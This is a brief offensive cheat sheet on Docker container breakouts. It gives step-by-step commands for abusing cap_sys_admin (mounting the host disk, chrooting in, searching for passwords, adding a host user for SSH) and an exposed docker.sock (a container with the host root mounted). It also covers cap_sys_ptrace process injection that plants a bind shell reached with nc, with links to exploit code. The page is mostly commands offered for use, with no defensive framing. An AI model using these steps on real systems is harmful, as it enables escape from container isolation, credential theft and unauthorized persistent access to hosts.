# Container Breakouts

## cap\_sys\_admin Capability

Check if there is cap\_sys\_admin privileges in docker container.&#x20;

```
capsh --print
```

if you see in the result `cap_sys_admin` then you can continue.

* Mount the root directory of host to container and look for the credentials or config files.&#x20;

```
fdisk -l 
mount /dev/sda /mnt
ls -l /mnt/

chroot /mnt/ bash
find / -name password 2>/dev/null
# and check credentials in root file system.
```

* Scan host machine and look for open ports
  * if there is open ssh port

```
chroot /mnt/ adduser turm
# give the password and it will add user to host system. 
# Then login to ssh port with that user. 
```

## docker.sock&#x20;

In the docker-container, if there is a docker.sock have a symlink to /run/docker.sock then there is possibility to do break out.&#x20;

```
find / -name docker.sock 2>/dev/null

#if you see in the result /run/docker.sock go for that way
```

Now we will create a container inside the docker container and connect it to host



```
docker images
# or pull docker images 
docker run -it -v /:/host/ ubuntu:22.04 bash

# That will give us a shell

cd /host/
chroot ./ bash

#after that part add a user and connect with ssh or find
#find credentials. 
```



## cap\_sys\_ptrace capability

if there is cap\_sys\_ptrace capability, then it is possible to inject process and create a bind shell on host it self then it is possible to jump over there via that port.&#x20;

Exploit that can be found

&#x20;[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)

{% embed url="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c" %}

After that change that shell code inside the c file and later

```
gcc inject.c -o inject`
```

later inject with PID of serveR

```
./inject 1234
```

then connect host machine with bind shell

`nc IP PORT`

